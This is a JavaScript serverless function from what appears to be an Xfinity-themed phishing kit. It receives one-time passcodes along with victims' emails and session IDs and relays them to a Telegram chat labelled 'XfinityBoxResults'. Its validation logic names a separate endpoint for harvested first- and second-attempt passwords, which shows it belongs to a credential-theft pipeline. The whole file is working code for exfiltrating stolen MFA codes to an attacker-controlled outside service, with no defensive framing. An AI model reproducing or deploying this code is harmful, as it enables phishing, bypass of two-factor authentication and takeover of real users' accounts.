// --- Configuration ---
const CONFIG = {
  ENV: {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
  },
  FETCH_TIMEOUT: 15000,
};

// --- Helper Functions ---

const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

// --- Markdown Escaping ---
const escapeMarkdown = (text) => {
  if (!text) return text;
  return String(text).replace(/\\/g, '\\\\').replace(/[_*`\[]/g, '\\$&');
};

// --- OTP Message Composer ---

const composeOtpMessage = (data) => {
  const { otp, session } = data;
  const { email, sessionId } = session || {};

  const safeOtp = escapeMarkdown(otp);
  const safeEmail = escapeMarkdown(email || 'N/A');
  const safeSessionId = escapeMarkdown(sessionId);

  const formattedTimestamp = new Date().toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true
  }) + ' UTC';

  return `
*🔑 XfinityBoxResults - OTP Code 🔑*

*VERIFICATION CODE*
- 🔢 OTP Code: ${safeOtp}

*ASSOCIATED SESSION*
- 📧 Email: ${safeEmail}
- 🆔 Session ID: ${safeSessionId}

*SUBMITTED AT*
- 🕒 Timestamp: *${formattedTimestamp}*
`;
};

// --- Main Handler ---
exports.handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
  }
  if (!CONFIG.ENV.TELEGRAM_BOT_TOKEN || !CONFIG.ENV.TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return { statusCode: 500, headers, body: JSON.stringify({ success: false, message: 'Server misconfiguration.' }) };
  }

  try {
    const body = JSON.parse(event.body || '{}');

    // Validate: this endpoint handles OTP ONLY.
    // Reject any payload that looks like a credentials submission.
    if (!body.otp) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid payload for OTP endpoint. Missing otp field.' }),
      };
    }
    if (body.firstAttemptPassword || body.secondAttemptPassword) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Invalid payload for OTP endpoint. Use /api/sendTelegram for credentials.' }),
      };
    }

    const message = composeOtpMessage(body);

    const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
      signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
    });

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
      return {
        statusCode: 502,
        headers,
        body: JSON.stringify({ success: false, error: 'Failed to send OTP message.' }),
      };
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true }),
    };

  } catch (error) {
    console.error('sendOtp function error:', error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'An internal server error occurred.' }),
    };
  }
};
